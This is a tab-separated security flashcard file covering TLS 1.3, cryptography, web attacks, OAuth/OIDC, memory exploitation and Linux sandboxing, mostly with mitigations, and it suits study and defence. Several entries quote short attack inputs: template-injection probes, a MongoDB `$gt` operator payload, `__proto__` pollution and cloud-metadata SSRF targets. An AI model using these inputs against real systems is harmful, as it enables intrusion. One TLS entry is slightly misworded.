# === Advanced TLS & Protocol Security ===

Explain the TLS 1.3 key schedule.	TLS 1.3 uses HKDF (HMAC-based Key Derivation Function) in two steps: `HKDF-Extract` combines input keying material with a salt to produce a pseudorandom key; `HKDF-Expand` derives specific keys (handshake traffic keys, application traffic keys, resumption secrets) from it. Each derivation incorporates the transcript hash of all handshake messages seen so far.
What is the transcript hash in TLS 1.3?	A running hash of all handshake messages exchanged. It's mixed into each key derivation step, cryptographically binding keys to the handshake context. Any tampering with handshake messages changes the hash, causing key mismatch and handshake failure.
What are the replay attack risks with TLS 1.3 0-RTT?	0-RTT early data can be replayed by an attacker who captures the ClientHello — the server can't distinguish a legitimate retry from replay. Dangerous for non-idempotent requests (payments, state changes). Mitigate with: single-use tickets, client-hello recording, or restricting 0-RTT to safe (GET) requests.
What is Encrypted Client Hello (ECH)?	A TLS extension that encrypts the ClientHello (including SNI) using a key published in DNS. Replaces the earlier ESNI proposal. Prevents network observers from seeing which site the user connects to.
How does ALPN interact with HTTP/2 and HTTP/3?	HTTP/2 over TLS requires ALPN to negotiate the `h2` protocol. Without ALPN, the server falls back to HTTP/1.1. HTTP/3 uses QUIC (UDP) and is advertised via the `Alt-Svc` header, but ALPN in the QUIC handshake negotiates `h3`.
What is TLS session resumption in TLS 1.3?	TLS 1.3 uses PSK-based resumption via NewSessionTicket messages sent after the handshake. The client presents the PSK identity in a subsequent ClientHello `pre_shared_key` extension. Session IDs and session tickets (TLS 1.2 style) are replaced by this unified PSK mechanism.
What is TLS_FALLBACK_SCSV?	A signaling cipher suite value that a client includes when retrying a connection with a lower TLS version. If the server supports a higher version, it detects the downgrade attempt and aborts. Prevents protocol downgrade attacks like POODLE.
What is the TLS 1.3 anti-downgrade sentinel?	In TLS 1.3, the server embeds a specific 8-byte value in the `ServerHello.random` field when negotiating TLS 1.2 (or lower) with a TLS 1.3-capable server. TLS 1.3 clients check for this sentinel and abort if detected — preventing MitM-forced downgrades.
How did the BEAST attack work against TLS 1.0?	BEAST exploited CBC mode's use of the last ciphertext block as the IV for the next record. An attacker could predict and manipulate the IV to decrypt data via chosen-plaintext attacks. Fixed by 1/n-1 record splitting, and eliminated in TLS 1.1+ which uses random explicit IVs.
What was POODLE and how did it affect SSL 3.0?	POODLE (Padding Oracle On Downgraded Legacy Encryption) exploited SSL 3.0's non-deterministic CBC padding. Attackers could decrypt data byte-by-byte. Fix: disable SSL 3.0 entirely (and later TLS 1.0 CBC, as a variant applied there too).
What are CRIME and BREACH attacks?	CRIME exploited TLS-level compression to leak secrets (session cookies) by observing compressed response sizes. BREACH applies the same technique to HTTP-level compression (gzip). Mitigate by disabling TLS compression (CRIME) and not reflecting secrets in compressed pages (BREACH).
What was Heartbleed (CVE-2014-0160)?	A buffer over-read in OpenSSL's Heartbeat TLS extension. Attackers could read up to 64KB of server memory per request — extracting private keys, session tokens, and passwords. Fixed in OpenSSL 1.0.1g. Lesson: memory-safe languages would have prevented it.
What are renegotiation attacks in TLS?	An attacker injects data before the TLS renegotiation, which the server concatenates with the authenticated client's request. CVE-2009-3555. Fixed by RFC 5746 (secure renegotiation), which binds renegotiation to the existing TLS session.
What is Certificate Transparency (CT)?	A public audit log system where CAs must log all issued certificates. Browsers require Signed Certificate Timestamps (SCTs) — proof of logging — either embedded in the cert, via OCSP stapling, or TLS extension. Enables detection of fraudulently issued certs.
What is DANE and how does it use DNSSEC?	DNS-Based Authentication of Named Entities — publishes TLSA records in DNS containing certificate/public key hashes. The client validates the server's certificate against DNS (requires DNSSEC to secure the DNS records). Reduces dependency on CAs.
What are delegated credentials?	Short-lived TLS credentials (hours, not months) that a certificate holder can issue to CDN edge servers. The edge server uses the delegated credential for TLS without holding the long-term private key. Reduces key exposure.
How does QUIC/HTTP3 handle TLS security?	QUIC integrates TLS 1.3 directly into its transport, encrypting both payload and most header fields from the first packet. Connection migration uses connection IDs (not IP/port), maintaining security across network changes. 0-RTT is supported with the same replay caveats.
What is STARTTLS and what are its security risks?	STARTTLS upgrades a plaintext connection (SMTP, IMAP) to TLS. Risks: the initial upgrade is in plaintext and can be stripped by a MitM (STRIPTLS attack). Mitigate with MTA-STS (SMTP) or configure mandatory TLS.
What is DTLS?	Datagram Transport Layer Security — TLS adapted for UDP. Handles packet loss and reordering. Used by WebRTC, VPNs (Cisco AnyConnect), and CoAP (IoT). DTLS 1.3 aligns with TLS 1.3 improvements.
What is post-quantum TLS and what is X25519Kyber768?	A hybrid key exchange combining classical (X25519 elliptic curve) and post-quantum (Kyber768 lattice-based) algorithms. If either is broken, the other still protects. Being deployed experimentally in Chrome and Cloudflare for forward secrecy against future quantum computers.
What security property does the TLS 1.3 transcript hash protect and how?	It cryptographically binds all derived session keys to the exact handshake messages exchanged. If a MitM modifies any handshake message (e.g., to downgrade cipher suites or inject a rogue key share), the transcript hash changes, causing key mismatch and handshake failure — making undetected modification computationally infeasible.
Why is 0-RTT data limited to idempotent operations and what mechanism can mitigate replay?	0-RTT data can be replayed by an attacker who captures the ClientHello before the server processes it. Non-idempotent requests (payments, state mutations) executed twice cause real harm. Mitigate with: single-use session tickets (server tracks used tickets), client hello recording with a time window, or restricting 0-RTT to safe methods (HTTP GET).
How does QUIC's integration of TLS 1.3 differ from TCP+TLS in terms of what is encrypted?	In TCP+TLS, transport metadata (TCP sequence numbers, headers) is plaintext — only the application payload is encrypted. In QUIC, TLS 1.3 runs directly over UDP and encrypts QUIC packet numbers and most transport headers from the second packet onward — a much larger portion of the protocol is opaque to observers.
What is the security tradeoff of TLS session resumption vs. full handshakes?	Resumption is faster (fewer round trips) but reuses previous keying material. If the resumption secret is compromised, all resumed sessions are vulnerable. Full handshakes generate fresh ephemeral keys each time. PFS with resumption depends on the original handshake using ephemeral key exchange.
How did the Logjam attack exploit weak DHE parameters?	Logjam exploited servers using 512-bit or 1024-bit Diffie-Hellman groups. A national-level adversary could precompute the discrete logarithm for common DH groups, then decrypt intercepted sessions. Mitigation: use 2048+ bit DH groups or preferably ECDHE (256-bit curves provide equivalent strength).
What is the relationship between Certificate Transparency (CT) and the CA trust model?	CT doesn't replace CAs but provides accountability. Every certificate must be logged in public append-only logs. Browsers require Signed Certificate Timestamps (SCTs) as proof. If a CA issues a fraudulent certificate, CT logs make it publicly detectable — deterring rogue issuance and enabling rapid response.
What is the difference between DTLS and TLS for security applications?	DTLS adapts TLS for UDP: it handles packet loss and reordering (which TCP handles natively). DTLS adds sequence numbers and retransmission to the handshake but must tolerate missing packets during data transfer. Used where UDP is required: VoIP (WebRTC), IoT (CoAP), and VPNs. Same cryptographic security as TLS.
How does STARTTLS differ from implicit TLS and why is implicit TLS preferred?	STARTTLS upgrades a plaintext connection to TLS mid-session — vulnerable to STRIPTLS attacks where a MitM removes the upgrade. Implicit TLS (dedicated TLS port, e.g., 465 for SMTPS) starts encrypted from the first byte — no downgrade possible. IETF now recommends implicit TLS over STARTTLS.
What is a TLS renegotiation attack and what makes RFC 5746 secure renegotiation safe?	In the original TLS renegotiation, a MitM could inject data before the client's authenticated renegotiation, making the server concatenate attacker data with the client's request. RFC 5746 binds renegotiation to the existing session by including the previous handshake's verify_data in the new handshake — detecting any injection.

# === Advanced Cryptography ===

What are the main families of post-quantum cryptography?	Lattice-based (Kyber, Dilithium — NIST winners), hash-based (SPHINCS+, XMSS — for signatures), code-based (Classic McEliece — established but large keys), and isogeny-based (SIKE — broken in 2022).
What is formal verification in cryptographic protocol analysis?	Using mathematical proof systems or model checkers (ProVerif, Tamarin, CryptoVerif) to prove that a protocol satisfies security properties (secrecy, authentication, forward secrecy) under adversary models.
What is a timing side-channel attack?	Measuring execution time differences to infer secret data. For example, comparing strings byte-by-byte with early exit reveals which position differs. Mitigate with constant-time implementations.
What is Shamir's Secret Sharing?	A threshold scheme that splits a secret into N shares, requiring any K shares to reconstruct it (K-of-N). Uses polynomial interpolation over a finite field. No information is revealed by fewer than K shares.
What are Zero-Knowledge Proofs (ZKPs)?	A proof system where the prover convinces the verifier that a statement is true without revealing any information beyond the truth of the statement. Examples: proving knowledge of a password hash preimage without revealing the password. Used in privacy-preserving protocols.
What is homomorphic encryption?	Encryption that allows computation on ciphertexts, producing encrypted results that, when decrypted, match the result of operations on plaintexts. FHE (Fully Homomorphic) supports arbitrary computations but is very slow. Used for privacy-preserving cloud computation.
What is cryptographic agility?	Designing systems so cryptographic algorithms can be swapped without rewriting the application. Essential for migrating away from broken algorithms (e.g., SHA-1→SHA-256, RSA→post-quantum). Avoid hardcoding algorithm choices.
What is key rotation and why is it important?	Periodically replacing cryptographic keys to limit the impact of key compromise. Old keys are retired/archived. Automated rotation (e.g., AWS KMS auto-rotation) reduces operational risk.
What is the difference between ML-KEM (Kyber) and ML-DSA (Dilithium) in post-quantum cryptography?	ML-KEM (NIST FIPS 203, formerly Kyber) is a Key Encapsulation Mechanism for establishing shared secrets / key exchange. ML-DSA (NIST FIPS 204, formerly Dilithium) is a digital signature algorithm. Both are lattice-based NIST standards, but they serve different cryptographic purposes.
Why does cryptographic agility matter especially for long-lived systems like automotive and IoT?	These systems have 10–15+ year lifespans but algorithms can be broken sooner. Agile systems can swap algorithms via configuration or OTA firmware update without architectural rewrites. Systems hardcoded to specific algorithms (e.g., RSA-2048 only) face costly refactoring or may become insecure before end-of-life.
Why is a timing side-channel in a password or MAC comparison function dangerous, and how is it fixed?	Byte-by-byte comparison with early exit takes less time when fewer bytes match, revealing through timing how many leading bytes are correct — enabling a character-by-character brute-force. Fix: use constant-time comparison (e.g., `MessageDigest.isEqual()` in Java, `hmac.compare_digest()` in Python). Note: `Arrays.equals()` is NOT guaranteed constant-time in all JVMs.
What is the difference between symmetric key wrapping and envelope encryption?	Key wrapping (AES-KW, RFC 3394) encrypts one key with another using a dedicated algorithm designed for key material — provides integrity without a separate MAC. Envelope encryption is a pattern: encrypt data with a DEK, then wrap the DEK with a KEK. Key wrapping is a mechanism used within envelope encryption.
What is a Merkle tree and how is it used for integrity verification?	A Merkle tree is a binary tree where each leaf is a hash of a data block, and each parent is a hash of its children. The root hash represents all data. To verify any single block, only log(N) hashes are needed (the "proof path"). Used in blockchains, Git, Certificate Transparency logs, and dm-verity.
What is the quantum computing threat to current cryptography?	Shor's algorithm on a quantum computer can break RSA, ECC, and DH in polynomial time by solving integer factorization and discrete logarithm problems. Symmetric algorithms (AES) need doubled key sizes (AES-256). Hash functions are largely safe. This is why post-quantum migration (ML-KEM, ML-DSA) is urgent for long-lived data.
What is a threshold signature scheme and how does it differ from multisig?	Threshold signatures (t-of-n) produce a single standard signature from t parties — verifiers can't distinguish it from a normal signature. Multisig requires n separate signatures that are individually verified. Threshold signatures are more private (hide the signing structure) and produce smaller, standard-format signatures.
What is key escrow and why is it controversial?	Key escrow stores copies of encryption keys with a third party (typically a government or organization), allowing them to decrypt data when authorized. Controversial because: it creates a single point of compromise, enables surveillance, weakens the overall security of the system, and historically escrow systems have been compromised.
What is key stretching and how does it relate to KDFs?	Key stretching transforms a weak input (short password) into a strong cryptographic key by running it through a computationally expensive function (many iterations). KDFs like PBKDF2, bcrypt, and Argon2 perform key stretching — they deliberately slow derivation to make brute-force attacks impractical.
What is authenticated key exchange and how does it prevent MitM?	Authenticated key exchange (e.g., SIGMA protocol used in TLS) combines Diffie-Hellman key exchange with digital signatures or MACs. The signature proves the identity of the party, so a MitM can't substitute their own DH public key without detection — solving DH's vulnerability to active attacks.

# === Advanced Web & Application Security ===

How do deserialization attacks work in Java?	Attackers provide a crafted serialized object graph containing "gadget chains" — sequences of existing library classes whose methods chain together during deserialization to achieve arbitrary code execution (e.g., `commons-collections` `InvokerTransformer`).
What is Server-Side Template Injection (SSTI)?	Injecting template syntax (e.g., `{{7*7}}` in Jinja2, `${7*7}` in FreeMarker) into server-side templates. If the template engine evaluates user input, attackers can execute arbitrary code on the server.
What is prototype pollution in JavaScript?	Modifying `Object.prototype` via user-controlled input (e.g., `__proto__` property in JSON). This injects properties into all objects, potentially bypassing security checks, causing XSS, or enabling RCE.
What is a TOCTOU (Time of Check to Time of Use) vulnerability?	A race condition where a security check and the subsequent action have a time gap. An attacker changes the state between check and use (e.g., replacing a validated file with a symlink to a sensitive file).
How do you secure WebSocket connections?	Validate the `Origin` header during the upgrade handshake (prevents CSWSH). Use WSS (TLS). Authenticate the initial handshake. Validate/sanitize all messages. Implement rate limiting.
What is supply chain attack via dependency confusion?	An attacker publishes a malicious package to a public registry with the same name as an internal private package. If the build system checks the public registry first (or preferentially), it installs the attacker's package.
What is a subdomain takeover?	When a DNS CNAME points to an external service (S3, Heroku, Azure) that has been deprovisioned. An attacker can claim the abandoned resource and serve content on the organization's subdomain.
What are HTTP/2 specific security concerns?	HPACK header compression (potential CRIME-like attacks), stream multiplexing DOS (rapid reset attacks, CVE-2023-44487), flow control abuse, priority manipulation, and header size-based DOS.
What is DOM clobbering?	Injecting HTML elements whose `id` or `name` attributes shadow global JavaScript variables/APIs. For example, `<form id="toString">` can break `toString()` calls, potentially bypassing security logic.
What is web cache poisoning?	Injecting malicious content via unkeyed inputs (headers like `X-Forwarded-Host`) that gets cached by CDN/proxy and served to all users. The cache amplifies the attack to anyone requesting the resource.
What makes a class a "gadget" in a Java deserialization gadget chain?	A gadget is an existing class in the classpath whose `readObject()`, `equals()`, `hashCode()`, `compareTo()`, or `toString()` method performs actions (reflection, method invocation, stream evaluation) when triggered during deserialization. Gadget chains link multiple such classes: deserializing the outer object triggers a cascade of method calls that ultimately reaches `Runtime.exec()` or equivalent.
How does prototype pollution in Node.js escalate from logic bypass to RCE?	If polluted `Object.prototype` properties reach unsafe sinks — such as `child_process.spawn()` constructing a command from object properties, template engines treating prototype properties as template variables, or `merge()` operations that propagate the polluted property — server-side code executes attacker-controlled values as code or commands.
What is the difference between web cache poisoning and cache deception?	Cache poisoning: attacker poisons the shared cache with malicious content served to all subsequent users of that cache entry. Cache deception: attacker tricks the victim's browser (or a CDN) into caching a sensitive, user-specific response — only the attacker retrieves that cached private data. Different goals, different victims.
How can subdomain takeover be exploited beyond serving phishing content?	An attacker claiming `docs.example.com` can: steal cookies scoped to `.example.com` (if `Domain=.example.com`), bypass CORS policies (legitimate subdomain is trusted), send email from the subdomain for phishing with legitimate-looking domain, receive OAuth redirects if the subdomain is a registered callback URL, or serve malicious scripts included by the main site.
What is NoSQL injection and how does it differ from SQL injection?	NoSQL injection exploits query operators in databases like MongoDB by injecting JSON operators ({"$gt": ""}) instead of SQL syntax. It can bypass authentication, extract data, or cause DoS. The principle is the same (mixing data with query logic) but the syntax and exploitation techniques differ.
What is HTTP parameter pollution and how is it exploited?	Sending duplicate parameters (e.g., ?id=1&id=2) where front-end and back-end frameworks handle duplicates differently. The WAF may check the first value while the application uses the last, allowing injection to bypass security filters. Different frameworks (PHP, .NET, Java) handle duplicate params differently.
What is a race condition vulnerability in web applications?	A race condition occurs when the application's behavior depends on the timing of concurrent requests. Example: checking a balance, then deducting — two simultaneous requests can both pass the check before either deducts, allowing double-spending. Prevent with database locks, atomic operations, or idempotency keys.
What is dependency confusion and how do you prevent it in CI/CD?	An attacker publishes a package with the same name as an internal/private package to a public registry (npm, PyPI). If the build system checks public first, it installs the malicious version. Prevent with: scoped packages (@company/pkg), private registry priority, lockfiles with hash verification, and namespace reservation.
How does web cache poisoning differ from web cache deception in terms of the attacker's goal?	Cache poisoning: attacker injects malicious content into the cache that all users receive (mass impact, attacker injects). Cache deception: attacker tricks a specific victim into caching their sensitive response, then retrieves it (targeted theft, victim's data). Poisoning attacks the supply side; deception attacks the demand side.
What is CSWSH (Cross-Site WebSocket Hijacking) and how is it prevented?	CSWSH occurs when a WebSocket upgrade handshake doesn't validate the Origin header. A malicious page can establish a WebSocket connection to a legitimate server using the victim's cookies (like CSRF). Prevent by checking the Origin header during the upgrade handshake and requiring a CSRF token.
What is Server-Side Request Forgery (SSRF) via DNS rebinding?	The attacker's domain initially resolves to a safe IP (passes validation), then quickly changes to an internal IP (127.0.0.1, 169.254.169.254). The server's DNS cache expires and the second resolution hits the internal target. Mitigate by resolving DNS once, then validating and connecting to the resolved IP directly.

# === Advanced Authentication & Identity ===

What is PKCE and why is it essential for public clients?	Proof Key for Code Exchange — the client generates a random `code_verifier`, sends its hash (`code_challenge`) with the authorization request, then proves possession by sending the `code_verifier` with the token exchange. Prevents authorization code interception.
What is DPoP (Demonstration of Proof of Possession)?	A mechanism where the client proves it holds the private key associated with the access token. Each request includes a DPoP proof JWT signed with the client's key. Prevents token theft/replay.
How do you properly validate an OIDC ID token?	Verify: (1) signature against the IdP's JWKS, (2) `iss` matches the expected issuer, (3) `aud` contains your client_id, (4) `exp` is not past, (5) `iat` is recent, (6) `nonce` matches your stored value, (7) `at_hash` matches the access token hash.
How does FIDO2/WebAuthn attestation work?	During registration, the authenticator signs the new credential's public key (along with the RP ID and challenge) and includes an attestation certificate chain. The RP can verify the authenticator model and manufacturer.
What are DIDs (Decentralized Identifiers)?	Self-sovereign identifiers (e.g., `did:web:example.com`) that are not dependent on a central registry. The DID Document (stored on-chain or a web server) contains public keys and service endpoints for authentication.
What is risk-based / adaptive authentication?	Adjusting authentication requirements based on risk signals: new device, unusual location, impossible travel, time of day, behavioral biometrics. Low-risk: seamless. High-risk: step-up to MFA or block.
What are the security properties that FIDO2/WebAuthn attestation provides to a relying party?	Attestation provides a verifiable chain of trust from the authenticator's hardware to the RP, proving: (1) the credential was generated inside genuine hardware of a specific model/batch, (2) the hardware has passed security certification (e.g., FIDO Certified Level 2+). Enables high-assurance policies such as "only allow FIDO L2+ hardware keys for admin accounts."
How does risk-based authentication differ from step-up authentication?	Risk-based authentication dynamically evaluates every request against risk signals (device, location, behavior) and adjusts requirements per-session or per-request. Step-up authentication triggers an additional challenge specifically when a high-privilege action is requested (e.g., changing payment details), regardless of prior risk assessment. They are complementary: risk signals can determine when to require a step-up challenge.
What is PKCE and why does it replace the OAuth 2.0 implicit grant type for public clients?	PKCE (Proof Key for Code Exchange) adds a `code_verifier`/`code_challenge` pair that proves the client initiating the token exchange is the same one that sent the authorization request — preventing authorization code interception. The implicit grant returned tokens in URL fragments (visible in browser history, referrer logs, JavaScript), making it unsafe. PKCE is now the standard for all public clients.
What is the difference between OIDC ID tokens and access tokens in terms of audience and usage?	ID tokens are for the client application (audience = client_id) — they carry user identity claims and should never be sent to resource servers. Access tokens are for resource servers (audience = API) — they authorize API calls. Sending an ID token to an API or using an access token for authentication are common security mistakes.
What is token binding and how does it prevent token theft?	Token binding cryptographically binds tokens to the TLS connection's key pair. A stolen token is useless on a different TLS connection because the binding verification fails. It prevents token replay, export, and man-in-the-browser attacks. Similar to DPoP but operates at the TLS layer.
What is the OAuth 2.0 Authorization Code flow and why is it more secure than the Implicit flow?	Authorization Code: the server receives a short-lived code, exchanges it for tokens via a back-channel HTTPS call (tokens never touch the browser). Implicit: tokens are returned in URL fragments directly to the browser (visible in history, logs, referrer). The back-channel exchange in Authorization Code flow prevents token interception.
What is Continuous Access Evaluation Protocol (CAEP) and how does it improve on static token lifetimes?	CAEP allows real-time session revocation based on security events (password change, device compromise, location anomaly). Instead of waiting for token expiry, the resource server receives push events from the identity provider and immediately terminates affected sessions. Part of the Shared Signals Framework (SSF).
How do you securely implement "Remember Me" functionality?	Issue a long-lived, random, single-use token stored as a Secure, HttpOnly cookie. Store a hash of the token server-side (not the token itself). On use, validate the hash, regenerate a new token, and require step-up authentication (MFA) for sensitive operations. Never use predictable values (user ID, timestamps).
What is the difference between identity federation and identity provisioning?	Federation allows users to authenticate via their home IdP and access resources at a relying party without creating local accounts (SAML, OIDC). Provisioning (SCIM) creates/updates/deletes actual user accounts in the target system. Federation delegates authentication; provisioning replicates identity data.

# === Advanced Memory Exploitation & Protection ===

How does Return-Oriented Programming (ROP) work?	Instead of injecting code (blocked by DEP/NX), the attacker chains small existing code fragments ("gadgets") that each end with a `ret` instruction. By overwriting the stack with gadget addresses, attacker-chosen code paths execute.
What is Jump-Oriented Programming (JOP)?	Like ROP but uses `jmp` instructions instead of `ret`. Requires a "dispatcher" gadget that controls the jump targets. Harder to detect than ROP because it doesn't rely on the return address.
What are tcache poisoning and fastbin attacks?	Heap exploitation techniques targeting glibc's memory allocator. tcache poisoning: corrupt the tcache free list to return an arbitrary address on the next `malloc()`. Fastbin: similar, but targets the fastbin single-linked list. Both achieve arbitrary write/read.
How can ASLR be bypassed?	Information leaks (format string bugs, memory disclosure) reveal addresses. Partial overwrites (overwriting only the LSBs that aren't randomized). Brute-force on 32-bit systems (limited entropy). Heap spraying with known offsets.
What is stack pivoting?	Changing the stack pointer (`rsp`/`esp`) to point to attacker-controlled memory (e.g., the heap). This gives the attacker a "second stack" full of ROP gadget addresses, enabling larger exploit chains.
What is Control-Flow Integrity (CFI)?	A security enforcement that ensures a program follows only its legitimate control-flow graph. Forward-edge CFI validates indirect call/jump targets. Backward-edge CFI (shadow stacks) protects return addresses.
What are shadow stacks (Intel CET, ARM BTI)?	Hardware features that maintain a second, protected stack containing only return addresses. On function return, the CPU compares the return address with the shadow stack copy. A mismatch triggers an exception, blocking ROP.
What is ARM Memory Tagging Extension (MTE)?	An ARM hardware feature that assigns 4-bit tags to memory pointers and memory regions. On access, the CPU checks that the pointer's tag matches the memory's tag. Detects use-after-free and buffer overflows with low overhead.
What are Spectre and Meltdown?	Microarchitectural side-channel attacks exploiting speculative execution. Spectre tricks branch prediction to speculatively access secret data, leaving traces in cache. Meltdown reads kernel memory from user space by exploiting out-of-order execution. Mitigations: Retpoline, KPTI, microcode updates.
What is the Rowhammer attack?	Rapidly reading/writing DRAM rows causes electrical interference that flips bits in adjacent rows. Attackers exploit this to modify page table entries, escalating privileges. Mitigated with ECC memory, TRR (Target Row Refresh), and DRAM refresh rate increases.
What is KASLR (Kernel ASLR)?	Randomization of the kernel's base address at boot. Makes kernel exploits harder by hiding the location of kernel code and data structures. Can be bypassed by information leaks (e.g., `/proc/kallsyms` if readable).
What is seccomp-BPF for sandboxing?	A Linux kernel feature where a process installs a BPF program that filters every system call. Each syscall is allowed, denied, or triggers a signal based on its number and arguments. Used by Chrome, Docker, and systemd.
What is AMD SEV (Secure Encrypted Virtualization)?	AMD hardware that encrypts each VM's memory with a unique key managed by the secure processor. The hypervisor cannot read VM memory. SEV-SNP adds integrity protection against memory replay/remapping.
What is Intel TME/MKTME?	Total Memory Encryption encrypts all DRAM with a platform key at the memory controller. Multi-Key TME (MKTME) allows per-VM or per-domain encryption keys. Protects against physical memory access attacks.
What is confidential computing?	A paradigm where data is protected during processing (in use), not just at rest and in transit. Uses hardware TEEs (AMD SEV, Intel TDX, ARM CCA) to encrypt VM/process memory from the host/hypervisor.
What is JIT spraying?	An exploitation technique that uses just-in-time compilers (JavaScript engines) to emit predictable machine code from controlled input. The attacker jumps to misaligned offsets in the JIT'd code to execute arbitrary instructions.
What is PartitionAlloc and how does it improve security?	Chrome's heap allocator that isolates object types in separate memory partitions. A use-after-free in one partition can't be exploited to craft fake objects of a different type. Also implements guard pages and hardened metadata.
What is the difference between forward-edge and backward-edge CFI, and why are both needed?	Forward-edge CFI validates targets of indirect calls and jumps (e.g., virtual dispatch, function pointers) — prevents calling arbitrary code via pointer corruption. Backward-edge CFI (shadow stacks) protects return addresses — prevents ROP (which chains `ret` instructions). Without backward-edge CFI, forward-edge alone leaves the entire ROP technique available.
How does ARM MTE (Memory Tagging Extension) detect use-after-free bugs with lower overhead than ASan?	When memory is freed, the allocator changes the memory region's 4-bit tag to a different value. The stale pointer retains the old tag. On the next access via the stale pointer, the CPU compares pointer tag to memory tag — mismatch raises an exception, catching use-after-free. MTE adds ~1% overhead vs ASan's ~2x, making it viable in production.
How does tcache poisoning achieve arbitrary code execution in modern glibc?	When a chunk is freed into the tcache, its forward pointer (`fd`) is written into the freed memory. An attacker with a write primitive (use-after-free or overflow) overwrites this `fd` pointer. The next `malloc()` of that size returns the attacker-controlled address as allocated memory. Writing to this address achieves an arbitrary write — typically targeting GOT entries, function pointers, or the `__free_hook` (pre-glibc 2.34).
What is a shadow stack and how does it differ from stack canaries?	A shadow stack is a hardware-maintained second stack containing only return addresses — the CPU verifies the return address matches on every function return (Intel CET, ARM GCS). Stack canaries are random values placed before the return address — checked by software before returning. Shadow stacks are harder to bypass because they're hardware-enforced and don't rely on secrecy of a value.
How does Spectre variant 1 (bounds check bypass) work?	The CPU speculatively executes past an array bounds check before the check completes. The speculative load accesses out-of-bounds memory (secrets), then uses the secret value to access a cache line. Even though speculative results are rolled back, the cache state change is observable via timing. The attacker reads the secret through the cache side-channel.
What is kernel page table isolation (KPTI) and which attack does it mitigate?	KPTI removes kernel memory mappings from user-space page tables. When a process runs in user mode, it can't see kernel memory at all. This mitigates Meltdown (CVE-2017-5754), where user-space code could read kernel memory via speculative execution. KPTI adds overhead (~5% on some workloads) due to TLB flushes on context switches.
What is RELRO (Relocation Read-Only) and what attacks does Full RELRO prevent?	Full RELRO resolves all dynamic symbols at load time and marks the Global Offset Table (GOT) as read-only. This prevents GOT overwrite attacks where an attacker modifies a GOT entry to redirect a library function call to malicious code. Partial RELRO only protects .init_array/.fini_array but leaves the GOT writable.
What is heap feng shui?	A technique for controlling heap layout by carefully allocating and freeing objects of specific sizes to place attacker-controlled data adjacent to a target object. This makes heap-based vulnerabilities (overflow, use-after-free) reliably exploitable by ensuring the attacker's data lands in a predictable location.
What is the difference between Spectre and Meltdown in terms of the security boundary they cross?	Meltdown crosses the user-kernel boundary — user-space code reads kernel memory. Spectre crosses arbitrary security boundaries (process, VM, sandbox) by training branch prediction to speculatively access data across those boundaries. Meltdown is specific to certain CPU designs and fixed by KPTI; Spectre is more fundamental and harder to mitigate.
How do ARM Pointer Authentication Codes (PAC) prevent ROP/JOP attacks?	PAC uses unused bits in 64-bit pointers to store a cryptographic MAC (computed using the pointer value, a context value, and a per-process secret key). Before using a pointer (return address, function pointer), the CPU verifies the MAC. Corrupted pointers fail verification, preventing attackers from redirecting control flow.

# === Unix / Linux Security (Advanced) ===

How does the Dirty Pipe vulnerability (CVE-2022-0847) work?	A bug in the Linux kernel's pipe buffer management allowed overwriting data in cached pages of read-only files. An unprivileged user could modify any file, including those owned by root, achieving privilege escalation.
How is eBPF used for security monitoring?	eBPF programs attach to kernel hooks (syscalls, network events, tracepoints) to observe and enforce security policies at near-native speed without kernel modules. Tools: Cilium (network policy), Falco, Tetragon.
What is Landlock?	A Linux Security Module (LSM) that allows unprivileged processes to sandbox themselves — restricting filesystem access and network operations. Unlike seccomp (syscall filtering), Landlock operates at path/object level.
What is a kernel-mode rootkit?	Malware that runs in kernel space (via loadable kernel modules or direct kernel memory manipulation). It can hide files/processes, intercept syscalls, and defeat user-space detection tools. Much harder to detect than user-mode rootkits.
How do container escapes happen?	Exploiting kernel vulnerabilities from within a container, misconfigured privileged containers (`--privileged`), exposed Docker socket (`/var/run/docker.sock`), capability misconfigurations, or writable host mount paths.
What is gVisor and how does it differ from standard containers?	gVisor interposes a user-space kernel (Sentry) that handles syscalls on behalf of the container, reducing the kernel attack surface. Containers never directly invoke host kernel syscalls. Higher isolation than namespaces alone.
What is BPF LSM?	An LSM (Linux Security Module) implemented via BPF programs. Allows dynamic, per-process security policies without writing kernel modules. Can enforce MAC decisions on file operations, socket access, etc.
How does IMA/EVM protect integrity on Linux?	Integrity Measurement Architecture (IMA) hashes files when accessed and compares against an expected value. Extended Verification Module (EVM) protects file metadata (xattrs) from tampering. Together they detect unauthorized file modifications.
What is IMA appraisal?	IMA appraisal mode blocks execution/opening of files whose hash doesn't match a signed policy. Combined with secure boot, it establishes a measured and verified boot chain from firmware to every executed binary.
How does eBPF enable security monitoring without the risks of traditional kernel modules?	eBPF programs are verified by the kernel verifier before loading — no unbounded loops, verified memory bounds, restricted helper calls. They attach to hooks (tracepoints, kprobes, socket hooks) and execute safely in kernel context. Security tools (Falco, Tetragon, Cilium) use eBPF for deep observability without the kernel module attack surface (arbitrary kernel code execution, hard to unload, can crash the kernel).
How does container escape via the Docker socket work and how is it prevented?	If a container has `/var/run/docker.sock` mounted, it can issue Docker API calls to create a new privileged container mounting the host filesystem — achieving full host compromise. Prevent by never mounting the socket in containers; use rootless Docker; or restrict access with a Docker socket proxy (e.g., Tecnativa docker-socket-proxy) that allows only specific safe API calls.
What is the difference between seccomp and Landlock as complementary sandboxing mechanisms?	Seccomp filters at the syscall level — it allows/denies specific system calls by number and arguments, reducing kernel attack surface. Landlock operates at the object level — it restricts which filesystem paths and network operations a process can access, using a descriptive policy. They address different dimensions: seccomp limits how; Landlock limits what objects can be accessed.
How does Dirty COW (CVE-2016-5195) differ from Dirty Pipe (CVE-2022-0847) in exploitation?	Dirty COW exploited a race condition in the kernel's copy-on-write mechanism, allowing an unprivileged user to write to read-only memory mappings. Dirty Pipe exploited pipe buffer management, allowing overwriting data in cached read-only pages. Both achieved write access to read-only files, but via completely different kernel subsystems.
What is a user namespace and how does it relate to rootless containers?	User namespaces map UID 0 inside the namespace to an unprivileged UID outside. A process appears to be root inside its namespace (can mount, create other namespaces) but has no privileges on the host. Rootless containers (Podman, rootless Docker) use user namespaces to run containers without requiring host root access.
How does eBPF CO-RE (Compile Once, Run Everywhere) improve security tool deployment?	Before CO-RE, eBPF programs needed to be compiled against the specific kernel version's headers. CO-RE uses BTF (BPF Type Format) to relocate struct field accesses at load time, allowing one compiled program to work across kernel versions. This makes deploying security monitors (Falco, Tetragon) across diverse fleets practical.
What is a kernel-mode rootkit's primary advantage over a user-mode rootkit?	A kernel-mode rootkit runs at ring 0 with full hardware access. It can intercept and modify syscall results (hiding files, processes, network connections from all user-space tools). User-mode rootkits run at ring 3 and can only modify specific applications. Kernel rootkits are invisible to user-space detection tools.
